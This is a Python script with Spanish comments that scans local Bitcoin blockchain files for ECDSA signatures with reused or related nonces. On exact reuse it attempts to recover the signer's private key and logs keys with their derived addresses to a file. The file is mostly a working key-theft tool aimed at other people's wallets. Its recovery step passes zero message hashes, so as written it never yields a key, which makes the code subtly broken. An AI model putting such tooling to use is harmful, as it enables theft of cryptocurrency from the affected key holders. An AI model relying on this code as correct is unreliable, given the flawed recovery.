"""
scanner_offline.py
==================
Escanea archivos blk*.dat de Bitcoin Core buscando patrones de ECDSA inseguros:
  1) Nonce reuse exacto (mismo r)
  2) Nonces relacionados (prefijo compartido / diferencia pequeña)
  3) Candidatos Android SecureRandom (heurística)

No requiere internet: parsea bloques directamente desde disco.
"""

from __future__ import annotations

import argparse
import csv
import hashlib
import json
import math
import struct
import sys
import time
from pathlib import Path
from typing import Iterator

import base58
from ecdsa import SECP256k1, SigningKey

try:
    from bech32 import bech32_encode, convertbits

    BECH32_AVAILABLE = True
except ImportError:
    BECH32_AVAILABLE = False


# ==================== CONFIGURACIÓN ====================
OUTPUT_CSV = "repeated_r_offline.csv"
RELATED_CSV = "related_nonce_offline.csv"
ANDROID_CSV = "android_securerandom.csv"
KEYS_FILE = "recovered_keys_offline.txt"
CHECKPOINT_FILE = "checkpoint_offline.json"

CHECKPOINT_EVERY = 10_000
MAX_BLOCKS = 335_000

RELATED_PREFIX_LEN = 16
RELATED_SMALL_DIFF = 2**40

ANDROID_PREFIX_LEN = 16
ANDROID_DIFF_MAX = 2**128

MAINNET_MAGIC = b"\xf9\xbe\xb4\xd9"
CURVE_N = SECP256k1.order


class BloomFilter:
    """Bloom filter simple para membership de r en O(1) con bajo RAM."""

    def __init__(self, capacity: int = 5_000_000, error_rate: float = 1e-5) -> None:
        self.size = max(1, int(-capacity * math.log(error_rate) / (math.log(2) ** 2)))
        self.hash_count = max(1, int(self.size / capacity * math.log(2)))
        self.bits = bytearray(self.size // 8 + 1)

    def _hashes(self, key: str) -> Iterator[int]:
        raw = key.encode("ascii")
        h1 = int.from_bytes(hashlib.sha256(raw).digest(), "big")
        h2 = int.from_bytes(hashlib.sha256(raw[::-1]).digest(), "big") | 1
        for i in range(self.hash_count):
            yield (h1 + i * h2) % self.size

    def add(self, key: str) -> None:
        for pos in self._hashes(key):
            self.bits[pos >> 3] |= 1 << (pos & 7)

    def __contains__(self, key: str) -> bool:
        return all(self.bits[pos >> 3] & (1 << (pos & 7)) for pos in self._hashes(key))

    def mem_mb(self) -> float:
        return len(self.bits) / 1_048_576


def read_varint(data: bytes, pos: int) -> tuple[int, int]:
    first = data[pos]
    pos += 1
    if first < 0xFD:
        return first, pos
    if first == 0xFD:
        return struct.unpack_from("<H", data, pos)[0], pos + 2
    if first == 0xFE:
        return struct.unpack_from("<I", data, pos)[0], pos + 4
    return struct.unpack_from("<Q", data, pos)[0], pos + 8


def load_xor_key(blk_dir: Path) -> bytes:
    xor_path = blk_dir / "xor.dat"
    if xor_path.exists():
        key = xor_path.read_bytes()
        print(f"XOR key encontrada ({len(key)} bytes).")
        return key
    return b""


def xor_decrypt(data: bytes, key: bytes, offset: int = 0) -> bytes:
    if not key:
        return data
    klen = len(key)
    return bytes(b ^ key[(offset + i) % klen] for i, b in enumerate(data))


def iter_blk_file(blk_path: Path, xor_key: bytes) -> Iterator[bytes]:
    with blk_path.open("rb") as f:
        file_offset = 0
        while True:
            raw_magic = f.read(4)
            if len(raw_magic) < 4:
                return

            magic = xor_decrypt(raw_magic, xor_key, file_offset)
            file_offset += 4

            if magic != MAINNET_MAGIC:
                buf = raw_magic
                while True:
                    if len(buf) >= 4:
                        probe = xor_decrypt(buf[-4:], xor_key, file_offset - 4)
                        if probe == MAINNET_MAGIC:
                            break
                    nxt = f.read(1)
                    if not nxt:
                        return
                    buf += nxt
                    file_offset += 1

            raw_size = f.read(4)
            if len(raw_size) < 4:
                return
            size = struct.unpack("<I", xor_decrypt(raw_size, xor_key, file_offset))[0]
            file_offset += 4

            if size <= 0 or size > 4_000_000:
                continue

            raw_block = f.read(size)
            if len(raw_block) < size:
                return
            block_data = xor_decrypt(raw_block, xor_key, file_offset)
            file_offset += size
            yield block_data


def get_blk_files(blk_dir: Path) -> list[Path]:
    files = sorted(blk_dir.glob("blk?????.dat"))
    return files if files else sorted(blk_dir.glob("blk*.dat"))


def extract_der_candidates(script_hex: str) -> list[str]:
    """Extrae múltiples DER candidates desde un scriptSig (incl. multisig)."""
    try:
        raw = bytes.fromhex(script_hex)
    except ValueError:
        return []

    out: list[str] = []
    i = 0
    n = len(raw)
    while i < n:
        op = raw[i]
        i += 1

        if op == 0:
            continue
        if 1 <= op <= 75:
            ln = op
        elif op == 76 and i < n:  # OP_PUSHDATA1
            ln = raw[i]
            i += 1
        elif op == 77 and i + 1 < n:  # OP_PUSHDATA2
            ln = raw[i] | (raw[i + 1] << 8)
            i += 2
        else:
            continue

        if i + ln > n:
            break

        candidate = raw[i : i + ln]
        i += ln
        if len(candidate) > 8 and candidate[0] == 0x30:
            # Último byte suele ser sighash type; guardamos DER sin sighash
            der = candidate[:-1] if candidate[-1] in (1, 2, 3, 0x81, 0x82, 0x83) else candidate
            if der and der[0] == 0x30:
                out.append(der.hex())
    return out


def parse_rs_from_der(sig_hex: str) -> tuple[int | None, int | None]:
    try:
        b = bytes.fromhex(sig_hex)
        if len(b) < 8 or b[0] != 0x30:
            return None, None
        if b[1] + 2 > len(b):
            return None, None

        p = 2
        if b[p] != 0x02:
            return None, None
        r_len = b[p + 1]
        r = int.from_bytes(b[p + 2 : p + 2 + r_len], "big")
        p += 2 + r_len

        if p + 1 >= len(b) or b[p] != 0x02:
            return None, None
        s_len = b[p + 1]
        s = int.from_bytes(b[p + 2 : p + 2 + s_len], "big")

        if not (1 <= r < CURVE_N and 1 <= s < CURVE_N):
            return None, None
        return r, s
    except Exception:
        return None, None


def parse_block(block: bytes) -> tuple[str | None, list[dict]]:
    try:
        pos = 0
        header = block[:80]
        pos += 80
        block_hash = hashlib.sha256(hashlib.sha256(header).digest()).digest()[::-1].hex()

        tx_count, pos = read_varint(block, pos)
        txs: list[dict] = []

        for _ in range(tx_count):
            tx_start = pos
            pos += 4  # version

            segwit = False
            if pos + 1 < len(block) and block[pos] == 0 and block[pos + 1] != 0:
                segwit = True
                pos += 2

            vin_n, pos = read_varint(block, pos)
            inputs: list[dict] = []
            for _ in range(vin_n):
                prev_txid = block[pos : pos + 32][::-1].hex()
                prev_vout = struct.unpack_from("<I", block, pos + 32)[0]
                pos += 36

                script_len, pos = read_varint(block, pos)
                script_sig = block[pos : pos + script_len].hex()
                pos += script_len
                pos += 4  # sequence

                inputs.append({"prev_txid": prev_txid, "prev_vout": prev_vout, "scriptsig": script_sig})

            vout_n, pos = read_varint(block, pos)
            for _ in range(vout_n):
                pos += 8
                slen, pos = read_varint(block, pos)
                pos += slen

            if segwit:
                for _ in range(vin_n):
                    wcount, pos = read_varint(block, pos)
                    for _ in range(wcount):
                        wlen, pos = read_varint(block, pos)
                        pos += wlen

            pos += 4  # locktime
            tx_raw = block[tx_start:pos]
            txid = hashlib.sha256(hashlib.sha256(tx_raw).digest()).digest()[::-1].hex()
            txs.append({"txid": txid, "inputs": inputs})

        return block_hash, txs
    except Exception:
        return None, []


def hash160(data: bytes) -> bytes:
    return hashlib.new("ripemd160", hashlib.sha256(data).digest()).digest()


def private_key_to_addresses(priv_hex: str) -> tuple[str, str]:
    try:
        raw = bytes.fromhex(priv_hex)
        if len(raw) != 32:
            return "INVALIDA", "INVALIDA"
        sk = SigningKey.from_string(raw, curve=SECP256k1)
        vk = sk.verifying_key
        x = vk.pubkey.point.x().to_bytes(32, "big")
        y = vk.pubkey.point.y()
        pub = (b"\x02" if (y % 2 == 0) else b"\x03") + x

        h = hash160(pub)
        payload = b"\x00" + h
        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
        legacy = base58.b58encode(payload + checksum).decode("ascii")

        if BECH32_AVAILABLE:
            segwit = bech32_encode("bc", [0] + convertbits(h, 8, 5))
        else:
            segwit = legacy
        return legacy, segwit
    except Exception as e:
        return f"ERROR:{e}", f"ERROR:{e}"


def recover_private_key(z1: int, z2: int, s1: int, s2: int, r: int) -> int | None:
    if s1 == s2:
        return None
    den = (r * ((s1 - s2) % CURVE_N)) % CURVE_N
    if den == 0:
        return None
    num = ((s2 * z1) - (s1 * z2)) % CURVE_N
    d = (num * pow(den, CURVE_N - 2, CURVE_N)) % CURVE_N
    return d if 0 < d < CURVE_N else None


def append_csv(path: Path, header: list[str], row: list[str]) -> None:
    exists = path.exists()
    with path.open("a", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        if not exists:
            w.writerow(header)
        w.writerow(row)


def load_checkpoint() -> int:
    p = Path(CHECKPOINT_FILE)
    if not p.exists():
        return 0
    try:
        return int(json.loads(p.read_text(encoding="utf-8")).get("blocks_processed", 0))
    except Exception:
        return 0


def save_checkpoint(count: int) -> None:
    Path(CHECKPOINT_FILE).write_text(json.dumps({"blocks_processed": count}), encoding="utf-8")


def scan(blk_dir: Path, max_blocks: int) -> int:
    blk_files = get_blk_files(blk_dir)
    if not blk_files:
        print(f"ERROR: no se encontraron blk*.dat en {blk_dir}")
        sys.exit(1)

    bloom = BloomFilter()
    r_seen: dict[str, dict] = {}
    prefix_seen: dict[str, list[dict]] = {}
    android_seen: dict[str, list[dict]] = {}

    seen_exact: set[tuple[str, str, str]] = set()
    seen_related: set[tuple[str, str, str]] = set()
    seen_android: set[tuple[str, str, str]] = set()

    results = 0
    rel_count = 0
    and_count = 0
    keys_count = 0

    xor_key = load_xor_key(blk_dir)
    skip = load_checkpoint()

    processed = 0
    t0 = time.time()

    print(f"Archivos blk: {len(blk_files)}")
    print(f"Checkpoint : {skip:,}")

    for blk_file in blk_files:
        print(f"Leyendo {blk_file.name}...")
        for block in iter_blk_file(blk_file, xor_key):
            if processed < skip:
                processed += 1
                continue
            if processed >= max_blocks:
                save_checkpoint(processed)
                return processed

            _, txs = parse_block(block)
            if not txs:
                processed += 1
                continue

            for tx in txs:
                txid = tx["txid"]
                for txin in tx["inputs"]:
                    sigs = extract_der_candidates(txin.get("scriptsig", ""))
                    if not sigs:
                        continue

                    for sig_der in sigs:
                        r, s = parse_rs_from_der(sig_der)
                        if r is None or s is None:
                            continue

                        r_hex = f"{r:064x}"

                        if (r_hex in bloom) and (r_hex in r_seen):
                            prev = r_seen[r_hex]
                            pair = (r_hex, prev["txid"], txid)
                            if pair not in seen_exact:
                                seen_exact.add(pair)
                                results += 1
                                priv = recover_private_key(0, 0, prev["s"], s, r)
                                priv_hex = f"{priv:064x}" if priv else "necesita_sighash"
                                append_csv(
                                    Path(OUTPUT_CSV),
                                    ["r", "tx1", "sig1", "tx2", "sig2", "private_key"],
                                    [r_hex, prev["txid"], prev["sig_der"], txid, sig_der, priv_hex],
                                )
                                if priv:
                                    keys_count += 1
                                    legacy, segwit = private_key_to_addresses(priv_hex)
                                    with Path(KEYS_FILE).open("a", encoding="utf-8") as f:
                                        f.write(
                                            f"{priv_hex}\t{legacy}\t{segwit}\t{r_hex}\t{prev['txid']}\t{txid}\n"
                                        )

                        if r_hex not in bloom:
                            bloom.add(r_hex)
                            r_seen[r_hex] = {"txid": txid, "sig_der": sig_der, "s": s}

                        pref = r_hex[:RELATED_PREFIX_LEN]
                        prior = prefix_seen.setdefault(pref, [])
                        for prev in prior:
                            if prev["r_hex"] == r_hex:
                                continue
                            pair = (pref, prev["txid"], txid)
                            if pair in seen_related:
                                continue

                            diff = abs(int(prev["r_hex"], 16) - r)
                            if diff > RELATED_SMALL_DIFF and r_hex[:8] != prev["r_hex"][:8]:
                                continue

                            seen_related.add(pair)
                            rel_count += 1
                            kind = "RELATED_SMALL_DIFF" if diff <= RELATED_SMALL_DIFF else "SAME_4BYTES_PREFIX"
                            append_csv(
                                Path(RELATED_CSV),
                                ["tipo", "r1", "r2", "tx1", "sig1", "tx2", "sig2", "prefix"],
                                [kind, prev["r_hex"], r_hex, prev["txid"], prev["sig_der"], txid, sig_der, pref],
                            )

                        prior.append({"r_hex": r_hex, "txid": txid, "sig_der": sig_der})

                        apref = r_hex[:ANDROID_PREFIX_LEN]
                        aset = android_seen.setdefault(apref, [])
                        for prev in aset:
                            if prev["r_hex"] == r_hex:
                                continue

                            diff_r = abs(int(prev["r_hex"], 16) - r)
                            if diff_r > ANDROID_DIFF_MAX:
                                continue

                            pair = (apref, prev["txid"], txid)
                            if pair in seen_android:
                                continue
                            seen_android.add(pair)
                            and_count += 1

                            conf = "ALTA" if diff_r < 2**32 else ("MEDIA" if diff_r < 2**64 else "BAJA")
                            append_csv(
                                Path(ANDROID_CSV),
                                [
                                    "r1",
                                    "r2",
                                    "diff_r",
                                    "tx1",
                                    "sig1",
                                    "tx2",
                                    "sig2",
                                    "prefix_8bytes",
                                    "block_approx",
                                    "confianza",
                                ],
                                [
                                    prev["r_hex"],
                                    r_hex,
                                    hex(diff_r),
                                    prev["txid"],
                                    prev["sig_der"],
                                    txid,
                                    sig_der,
                                    apref,
                                    str(processed),
                                    conf,
                                ],
                            )

                        aset.append({"r_hex": r_hex, "txid": txid})

            processed += 1
            if processed % CHECKPOINT_EVERY == 0:
                elapsed = max(1e-9, time.time() - t0)
                print(
                    f"→ {processed:,} bloques | exact:{results} related:{rel_count} "
                    f"android:{and_count} keys:{keys_count} | "
                    f"bloom:{bloom.mem_mb():.1f}MB | {(processed/elapsed):.0f} blk/s"
                )
                save_checkpoint(processed)

    save_checkpoint(processed)
    return processed


def main() -> None:
    parser = argparse.ArgumentParser(description="Scanner offline de nonces ECDSA inseguros")
    parser.add_argument(
        "--blkdir",
        default=str(Path.home() / "AppData/Roaming/Bitcoin/blocks"),
        help="Directorio con blk*.dat",
    )
    parser.add_argument(
        "--maxblock",
        type=int,
        default=MAX_BLOCKS,
        help=f"Número máximo de bloques a procesar (default: {MAX_BLOCKS})",
    )
    args = parser.parse_args()

    print("=" * 70)
    print("SCANNER OFFLINE - ECDSA Weak Nonce Detector")
    print("=" * 70)
    total = scan(Path(args.blkdir), args.maxblock)
    print("=" * 70)
    print(f"Escaneo finalizado. Bloques procesados: {total:,}")
    print(f"Resultados: {OUTPUT_CSV}, {RELATED_CSV}, {ANDROID_CSV}, {KEYS_FILE}")


if __name__ == "__main__":
    main()
